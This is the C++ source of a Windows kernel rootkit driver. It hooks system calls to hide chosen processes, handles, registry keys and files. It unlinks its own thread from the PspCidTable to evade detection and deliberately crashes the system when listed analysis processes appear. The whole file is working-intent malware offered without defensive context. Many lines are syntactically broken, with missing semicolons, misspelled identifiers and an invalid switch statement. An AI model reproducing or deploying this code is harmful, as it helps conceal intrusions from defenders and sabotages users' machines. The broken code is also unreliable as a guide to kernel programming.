#include "includes.hpp"
#include "defs.hpp"
#include "hook.hpp"
#include "imports.hpp"
#include "utils.hpp"
//define global variables

wchar_t dllpath;
wchar_t target_proc;

#define _WIN32_WINNT 0x0600 // Windows Vista and above

NTSTATUS DelayTimeWorked;
// std::vector<const char *> pidstohide = {};
DWORD pidstohide[MAX_HIDE_PROCESSES] = {0};
int pidstohide_count = 0;
HANDLE h_Thread;

typedef NTSYSAPI NTSTATUS ZwEnumerateKey_t(
  [in]            HANDLE                KeyHandle,
  [in]            ULONG                 Index,
  [in]            KEY_INFORMATION_CLASS KeyInformationClass,
  [out, optional] PVOID                 KeyInformation,
  [in]            ULONG                 Length,
  [out]           PULONG                ResultLength
);

//NTSTATUS WINAPI HOOKED_E
typedef NTSTATUS WINAPI ZwQuerySystemInformation_t(
  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
  _Inout_   PVOID                    SystemInformation,
  _In_      ULONG                    SystemInformationLength,
  _Out_opt_ PULONG                   ReturnLength
);

typedef NTSYSAPI NTSTATUS ZwEnumerateValueKey_t(
  [in]            HANDLE                      KeyHandle,
  [in]            ULONG                       Index,
  [in]            KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  [out, optional] PVOID                       KeyValueInformation,
  [in]            ULONG                       Length,
  [out]           PULONG                      ResultLength
);

typedef NTSYSAPI NTSTATUS ZwQueryDirectoryFile_t(
  [in]           HANDLE                 FileHandle,
  [in, optional] HANDLE                 Event,
  [in, optional] PIO_APC_ROUTINE        ApcRoutine,
  [in, optional] PVOID                  ApcContext,
  [out]          PIO_STATUS_BLOCK       IoStatusBlock,
  [out]          PVOID                  FileInformation,
  [in]           ULONG                  Length,
  [in]           FILE_INFORMATION_CLASS FileInformationClass,
  [in]           BOOLEAN                ReturnSingleEntry,
  [in, optional] PUNICODE_STRING        FileName,
  [in]           BOOLEAN                RestartScan
);

void RestorePspCidTable(const HANDLE threadId);

// These will hold the Address of the syscalls
ZwQuerySystemInformation_t g_SysInfo = 0;
ZwEnumerateKey_t g_EnumKey = 0;
ZwEnumerateValueKey_t g_EnumValKey = 0;
ZwQueryDirectoryFile_t g_QueryDir = 0;

CLIENT_ID DetectionClient{0};

//Driver Unload Routine
VOID DriverUnload(PDRIVER_OBJECT DriverObject){
    UNREFERENCED_PARAMETER(DriverObject);
    stopThread = TRUE; //Stop the thread
    RestorePspCidTable(reinterpret_cast<HANDLE>(DetectionClient.UniqueThread));
    k_hook::stop() //stop the hook
    LARGE_INTEGER integer{ 0 };
    integer.QuadPart = -10000;
    integer.QuadPart *= 10000;
    KeDelayExecutionThread(KernelMode, FALSE, &integer); //Wait for only short for the hook to finish
}

PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(const ULONG64* pHandleTable, const LONGLONG Handle)
{
    ULONGLONG v2; // rdx
    LONGLONG v3; // r8
     
    v2 = Handle & 0xFFFFFFFFFFFFFFFC;
    if (v2 >= *pHandleTable)
        return 0;
    v3 = *(pHandleTable + 1);
    if ((v3 & 3) == 1)
        return reinterpret_cast<PHANDLE_TABLE_ENTRY>(*reinterpret_cast<ULONG_PTR*>(v3 + 8 * (v2 >> 10) - 1) + 4 * (v2 & 0x3FF));
    if ((v3 & 3) != 0)
        return reinterpret_cast<PHANDLE_TABLE_ENTRY>(*reinterpret_cast<ULONG_PTR*>(*reinterpret_cast<ULONG_PTR*>(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF)) + 4 * (v2 & 0x3FF));
    return reinterpret_cast<PHANDLE_TABLE_ENTRY>(v3 + 4 * v2);
}

DUMP_HEADER __dump_header;

VOID DumpHeader()
{
  CONTEXT context = {0};
  PDUMP_HEADER tmp = NULL;
  PKDEBUGGER_DATA64 KdDebuggerDataBlock = NULL;+
  Context.ContextFlags = CONTEXT_FUL;
  RtlCaptureContext(&Context);
#ifndef _WIN64
#define DUMP_BLOCK_SIZE 0x20000
#else
#define DUMP_BLOCK_SIZE 0x40000
  tmp = ExAllocatePool(NonPagedPool, DUMP_BLOCK_SIZE);
  if (NULL != tmp)
  {
    UNICODE_STRING Function = RTL_CONSTANT_STRING(L"KeCapturePersistentThreadState");
    auto pCapturePersistentThreadState = reinterpret_cast<void(*)(CONTEXT*, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, void*)>(MmGetSystemRoutineAddress(&function));
    __int64 Return = pCapturePersistentThreadState(&Context, NULL, 0, 0, 0, 0, 0, tmp);
    if (Return)
    {
#pragma warning(disable : 4133)
      KdDebuggerDataBlock = (PKDEBUGGER_DATA64)tmp->KdDebuggerDataBlock;
#pragma warning(default : 4133)
      memcpy(&__dump_header, KdDebuggerDataBlock, sizeof(__dump_header))
    }
  }
  ExFreePool(tmp);
}

ULONG64* resolve(const ULONG64 addressInstructions, const int opcodeBytes, int addressBytes)
{
  addressBytes += opcodeBytes;
  const ULONG32 RelativeOffset = *reinterpret_cast<ULONG32*>(addressInstructions + opcodeBytes);
  return reinterpret_cast<ULONG64*>(addressInstructions + RelativeOffset + addressBytes);
}

typedef BOOLEAN(*func)(const PHANDLE_TABLE, const HANDLE, const PHANDLE_TABLE_ENTRY);
func ExDestroyHandle;

PHANDLE_TABLE_ENTRY ogCidEntry;

void DestroyPspCidTableEntry(const HANDLE threadId)
{
  ULONG64* phandleTable = reinterpret_cast<ULONG64*>(__dump_header->PspCidTable;)
  const PHANDLE_TABLE_ENTRY pCidEntry = ExpLookupHandleTableEntry(pHandleTable, reinterpret_cast<LONGLONG>(threadId));
  ogCidEntry = pCidEntry;
  if (pCidEntry != NULL)
  {
    unsigned long long tmp;
    unsigned long long ntoskrnl = utils::get_module_base("ntoskrnl.exe", &tmp);
    const ULONG64* pExDestroyHandle = resolve(reinterpret_cast<ULONG64>(utils::find_pattern_image(ntoskrnl, "\x8B\x93\xAC\x05\x00\x00\x4C\x8B\xC0\x48\x8B\x00\x00\x00\x00\x00\xE8\x00\x00\x00\x00", "xxxxxxxxxxx?????x????", ".text")),17, 4);
    ExDestroyHandle = reinterpret_cast<func>(pExDestroyHandle);
    log_debug("Cid entry: %p", pCidEntry)
    log_debug("ObjectPointerBits: %p", pCidEntry->ObjectPointerBits)
    ExDestroyHandle(reinterpret_cast<PHANDLE_TABLE>(pHandleTable), threadId, pCidEntry);
    if (pCidEntry->ObjectPointerBits == 0)
    {
      log_debug("Entry removed");
      log_debug("ObjectPointerBits: %p", pCidEntry->ObjectPointerBits);
    }
  }
}

typedef struct _KNMI_HANDLER_CALLBACK
{
    struct _KNMI_HANDLER_CALLBACK* Next;
    PNMI_CALLBACK Callback;
    PVOID Context;
    PVOID Handle;
} KNMI_HANDLER_CALLBACK, *PKNMI_HANDLER_CALLBACK;



void RestorePspCidTable(const HANDLE threadId)
{
  ULONG64* pHandleTable = reinterpret_cast<ULONG64*>(__dump_header->PspCidTable);
  PHANDLE_TABLE_ENTRY pCidEntry = ExpLookupHandleTableEntry(pHandleTable, reinterpret_cast<LONGLONG>(threadId));
  *pCidEntry = *ogCidEntry;
  log_Debug("Cid Entry restored: %p", pCidEntry->ObjectPointerBits);
}

namespace Hooks{
  NTSTATUS NTAPI HookedHandles(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
  {
    NTSTATUS status;
    status = g_SysInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (status == STATUS_SUCCESS)
    {
      if (SystemInformationClass == SystemHandleInformation)
      {
        SYSTEM_HANDLE_INFORMATION pshi = reinterpret_cast<SYSTEM_HANDLE_INFORMATION>(SystemInformation);
        for (ULONG i = 0; i < pshi->NumberOfHandles; i++)
        {
          PSYSTEM_HANDLE_TABLE_ENTRY_INFO Handle = &pshi->Handles[i];
          bool hide = false;
          for (int n = 0; n < pidstohide_count; ++n)
          {
            if (Handle.UniqueProcessId == (USHORT)pidstohide[n]) {
              hide = true;
              break;
            }
          }
          if (hide)
          {
            if (pshi->NumberOfHandles - 1 == i)
            {
              memmove(Handle, &pshi->Handles[i - 1], sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            } else {
              memmove(Handle, &pshi->Handles[i + 1], sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO))
            }
            --pshi->NumberOfHandles;
            --i;
          }
        } else if (SystemInformationClass == SystemExtendedHandleInformation) {
          PSYSTEM_HANDLE_INFORMATION_EX pshi = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(SystemInformation);
          for (ULONG_PTR i = 0; i < pshi->NumberOfHandles; i++)
          {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handle = &pshi->Handles[i];
            bool hide = false;
            for (int n = 0; n < pidstohide_count; ++n)
            {
              if (Handle->UniqueProcessId == (HANDLE)pidstohide[i])
              {
                hide = true;
                break;
              }
            }
            if (hide)
            {
              if (pshi->NumberOfHandles - 1 == i)
              {
                memmove(Handle, &pshi->Handles[i -1], sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
              } else {
                memmove(Handle, &pshi->Handles[i + 1], sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
              }
              --pshi->NumberOfHandles;
              --i;
            }
          }
        }
      }
    }
    return status;
  }
  NTSTATUS NTAPI HookedZwEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    NTSTATUS status = g_EnumKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
    WCHAR* keyName = NULL;

    if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION*)KeyInformation)->Name;
    if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION*)KeyInformation)->Name;

    for (int i = 0; i < MAX_HIDE_REGS && HIDE_REGS[i] != NULL; ++i) {
        if (wcsstr(keyName, HIDE_REGS[i])) {
            RtlZeroMemory(KeyInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
  };
  NTSTATUS NTAPI HookedZwEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    NTSTATUS status = g_EnumValKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
    WCHAR* keyValueName = NULL;

    if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name;
    if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name;

    for (int i = 0; i < MAX_HIDE_REGS && HIDE_REGS[i] != NULL; ++i) {
        if (wcsstr(keyValueName, HIDE_REGS[i])) {
            RtlZeroMemory(KeyValueInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
  };
  NTSTATUS NTAPI h_SystemProcessInformation( //Hooked NtQuerySystemINformation -> SYSTEM_PROCESS_INFORMATION
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = g_SysInfo( //Call original one
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (status == STATUS_SUCCESS) {
        PSSYSTEM_PROCESS_INFORMATION pspi = (PSSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSSYSTEM_PROCESS_INFORMATION prev = nullptr;
        PSSYSTEM_PROCESS_INFORMATION next = nullptr;
        while (pspi) {
            next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
            bool hide = false;
            for (int i = 0; i < pidstohide_count; ++i) {
                if (pspi->ProcessId == (HANDLE)pidstohide[i]) { //cmp process id to the ones to hide
                    hide = true;
                    break;
                }
            }
            if (hide) { 
                if (prev) { //if there is a previous one
                    if (pspi->NextEntryOffset) { //if we are not last one
                        prev->NextEntryOffset += pspi->NextEntryOffset; //change the offset to skip current process
                    } else {
                        prev->NextEntryOffset = 0; //if we are last one just set it to 0
                    }
                } else {
                    next->Offset = 0;
                    next->NextEntryOffset += pspi->NextEntryOffset;
                    memmove(&pspi, &next, next->NextEntryOffset);
                }
                if (pspi->NextEntryOffset == 0)
                    break; //break if last one
                pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
                continue;
            }
            prev = pspi; //set the previous one
            if (pspi->NextEntryOffset == 0)
                break;
            pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset); //loop
        }
    }
    return status;
  }
  NTSTATUS NTAPI h_NtQueryDirectoryFile( //Hooked function for hiding files and folders
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {

    NTSTATUS status = g_QueryDir( //Call the orginal
        FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length,
        FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan
    );

    if (status == STATUS_SUCCESS && FileInformation != nullptr){ //Check if the call worked
        PFILE_DIRECTORY_INFORMATION dirinfo = (PFILE_DIRECTORY_INFORMATION)FileInformation;
        PFILE_DIRECTORY_INFORMATION prev = nullptr;
        while (true){
            bool shouldHide = false;

            for (int i = 0; i < MAX_HIDE_FILES && HideFiles[i] != NULL; ++i){
                if (_wcsicmp(dirinfo->FileName, HideFiles[i]) == 0) { //compare the file name to all targets
                    shouldHide = true;
                    break;
                }
            }

            if (shouldHide) {
                if (prev){
                    if (dirinfo->NextEntryOffset != 0){
                        prev->NextEntryOffset += dirinfo->NextEntryOffset; //Change the offset to skip the file
                    } else {
                        prev->NextEntryOffset = 0; //break early if it is the last one
                    }
                } else {
                    //memmove again, check on ipad how
              		    memmove(dirinfo, (PBYTE)dirinfo + dirinfo->NextEntryOffset, Length - ((PBYTE)dirinfo - (PBYTE)FileInformtation) - dirinfo->NextEntryOffset);
              		    continue;
                }
            } else {
                prev = dirinfo;
            }
    
            if (dirinfo->NextEntryOffset == 0) break;  //break if last one

            dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset); //loop through
        }
    }
    return status;

  }
}

#define HIDE_REG L"$$hide"


struct OriginalFlags
{
  UCHAR ApcQueueable;
}ogFLags;
bool doOncePerBoot = TRUE;

void DisableApcQueueable()
{
  PKTHREAD pThread = KeGetCurrentThread();
  if (doOncePerBoot)
  {
    ogFLags.ApcQueueable = pThread->ApcQueueable;
    doOncePerBoot = False;
  }
  pThread->ApcQueueable = 0;
}

void RestoreApcQueueable()
{
  PKTHREAD pThread = KeGetCurrentThread();
  pThread->ApcQueueable = ogFLags.ApcQueueable;
}


NTSTATUS name2pid(PCWSTR executable_name, PHANDLE pOutHandle)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0;
    BOOLEAN found = FALSE;
    PSYSTEM_PROCESS_INFORMATION spi = NULL;
    UNICODE_STRING targetName;
     
    *pOutHandle = nullptr;
     
    RtlInitUnicodeString(&targetName, executable_name);
     
    status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
        return status;
     
    buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'proc');
    if (!buffer)
        return STATUS_INSUFFICIENT_RESOURCES;
     
    status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(buffer, 'proc');
        return status;
    }
     
    spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (TRUE) {
        if (spi->UniqueProcessId && spi->ImageName.Buffer) {
            UNICODE_STRING currentName;
            RtlInitUnicodeString(&currentName, spi->ImageName.Buffer);
     
            if (RtlCompareUnicodeString(&currentName, &targetName, FALSE) == 0) {
                *pOutHandle = spi->UniqueProcessId;
                found = TRUE;
                break;
            }
        }
     
        if (spi->NextEntryOffset == 0) break;
     
        spi = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)spi + spi->NextEntryOffset);
    }
     
    ExFreePoolWithTag(buffer, 'proc');
     
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

BOOLEAN IsProcessRunning(PCWSTR processName){
  ANSI_STRING ansiStr;
  UNICODE_STRING uniStr;
  RtlInitUnicodeString(&uniStr, processName);
  if (!NT_SUCCESS(RtlUnicodeStringToAnsiString(&ansiStr, &uniStr, TRUE)))
  {
    log_debug("Failed to convert PCWSTR to ANSI_STRING.");
    return FALSE;
  }
	log_debug("Checking if Process %s is running...", ansiStr.Buffer);
  RtlFreeAnsiString(&ansiStr);
	HANDLE tmp;
	if (name2pid(processName, &tmp) == STATUS_NOT_FOUND) return FALSE;
	return TRUE;
}


NTSTATUS NTAPI SysQueryHandler(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
  if (SystemInformationClass == SystemExtendedHandleInformation || SystemHandleInformation) return Hooks::HookedHandles(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
  if (SystemInformationClass == SystemProcessInformation) return Hooks::h_SystemProcessInformation(SystemInforamtionClass, SystemInformation, SystemInformationLength, ReturnLength);
}

void __fastcall kHookCallback(unsigned long long ssdt_index, void** ssdt_address)
{
  UNREFERENCED_PARAMETER(ssdt_index);
  switch (*ssdt_address)
  {
    case g_EnumKey && E_HideKeys:
      *ssdt_address = Hooks::HookedZwEnumerateKey;
      break;
    case g_EnumValKey && E_HideKeys:
      *ssdt_address = Hooks::HookedZwEnumerateValueKey;
      break;
    case g_QueryDir && E_HideFiles:
      *ssdt_address = Hooks::h_NtQueryDirectoryFile;
      break;
    case g_SysInfo && E_HideProcesses || HideHandles:
      *ssdt_address = SysQueryHandler;
      break;
  }
}

CLIENT_ID BsodClient{0};
OBJECT_ATTRIBUTES att{0};


BOOLEAN stopThread = FALSE;
VOID BsodThread(
    PVOID StartContext
) {
    UNREFERENCED_PARAMETER(StartContext);
    DestroyPspCidTableEntry(reinterpret_cast<HANDLE>(BsodClient.UniqueThread));
    while (!stopThread) {
        for (int i = 0; i < MAX_BSOD_PROCESSES && BSODProcesses[i] != NULL; ++i) {
            if (IsProcessRunning(BSODProcesses[i])) {
                KeBugCheckEx(0xDEAD, 0, 0, 0, 0, 0);
            }
        }
	    LARGE_INTEGER integer{ 0 };
	    integer.QuadPart = -10000;
	    integer.QuadPart *= 10000;
      KeDelayExecutionThread(KernelMode, FALSE, integer);
    }
    RestoreApcQueueable();
    RestorePspCidTable(reinterpret_cast<HANDLE>(BsodClient.UniqueThread);
    PsTerminateSystemThread(STATUS_SUCCESS);
}

VOID DelayTimeWorkItem(PDEVICE_OBJECT DeviceObject, PVOID Context){
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_WORKITEM workItem = (PIO_WORKITEM)Context;

    LARGE_INTEGER time{ 0 };
    time.QuadPart = DelayTime * -1;
    time.QuadPart *= DelayTime;
    KeDelayExecutionThread(KernelMode, FALSE, &time);

    DisableApcQueueable();

    DWORD pid;
    pidstohide_count = 0;
    for (int i = 0; i < MAX_HIDE_PROCESSES && HideProcesses[i] != NULL; ++i) {
        log_debug("Retrieving PID of %s", HideProcesses[i]);
        HANDLE foundPid = 0;
        UNICODE_STRING procName;
        WCHAR procNameW[260];
        size_t outSize = 0;
        mbstowcs_s(&outSize, procNameW, HideProcesses[i], _countof(procNameW) - 1);
        procNameW[_countof(procNameW) - 1] = L'\0';

        NTSTATUS status = name2pid(procNameW, &foundPid);
        if (NT_SUCCESS(status) && foundPid != 0 && pidstohide_count < MAX_HIDE_PROCESSES) {
            pidstohide[pidstohide_count++] = (DWORD)(ULONG_PTR)foundPid;
            log_debug("Found PID %u for %s", (unsigned int)foundPid, HideProcesses[i]);
        }
    }
    
    g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwQuerySystemInformation"));
    g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwEnumerateValueKey"));
    g_QueryDir = (ZwQueryDirectoryFile_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwQueryDirectoryFile"));
    g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwEnumerateKey"));
    
    NTSTATUS Hook = k_hook::initialize(kHookCallback) && k_hook::start(&DetectionClient) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
    if (Hook == STATUS_UNSUCCESSFUL) log_debug("Failed to hook GetCpuClock.");
    

    InitializeObjectAttributes(&att, 0, OBJ_KERNEL_HANDLE, 0, 0);
    NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, &att, NULL, &BsodClient, BsodThread, NULL);
    if (!NT_SUCCESS(status)){
        log_debug("Failed to create a thread.");
        DelayTimeWorked = status;
    }
    ZwClose(h_Thread);
    DelayTimeWorked = NT_SUCCESS;
    IoFreeWorkItem(workItem);
}

void StartDelayedInit(PDEVICE_OBJECT DeviceObject)
{
    PIO_WORKITEM workItem = IoAllocateWorkItem(DeviceObject);
    if (workItem)
    {
        IoQueueWorkItem(workItem, DelayTimeWorkItem, DelayedWorkQueue, workItem);
    }
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpreserved){
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;
    if (DelayExcecution){
      StartDelayedInit()
    } else {
        DisableApcQueueable();

        DWORD pid;
        pidstohide_count = 0;
        for (int i = 0; i < MAX_HIDE_PROCESSES && HideProcesses[i] != NULL; ++i) {
            log_debug("Retrieving PID of %s", HideProcesses[i]);
            HANDLE foundPid = 0;
            UNICODE_STRING procName;
            WCHAR procNameW[260];
            size_t outSize = 0;
            mbstowcs_s(&outSize, procNameW, HideProcesses[i], _countof(procNameW) - 1);
            procNameW[_countof(procNameW) - 1] = L'\0';

            NTSTATUS status = name2pid(procNameW, &foundPid);
            if (NT_SUCCESS(status) && foundPid != 0 && pidstohide_count < MAX_HIDE_PROCESSES) {
                pidstohide[pidstohide_count++] = (DWORD)(ULONG_PTR)foundPid;
                log_debug("Found PID %u for %s", (unsigned int)foundPid, HideProcesses[i]);
            }
        }

        NTSTATUS Hook;
        g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwQuerySystemInformation"));
        g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwEnumerateValueKey"));
        g_QueryDir = (ZwQueryDirectoryFile_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwQueryDirectoryFile"));
        g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwEnumerateKey"));

        NTSTATUS Hook = k_hook::initialize(kHookCallback) && k_hook::start(&DetectionClient) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL) log_debug("Failed to hook GetCpuClock.");
        InitializeObjectAttributes(&att, 0, OBJ_KERNEL_HANDLE, 0, 0);
        NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, &att, NULL, &BsodClient, BsodThread, NULL);
        if (!NT_SUCCESS(status)){
            log_debug("Failed to create a thread.");
            return status;
        }
    }

    ZwClose(h_Thread)
    return STATUS_SUCCESS;
}

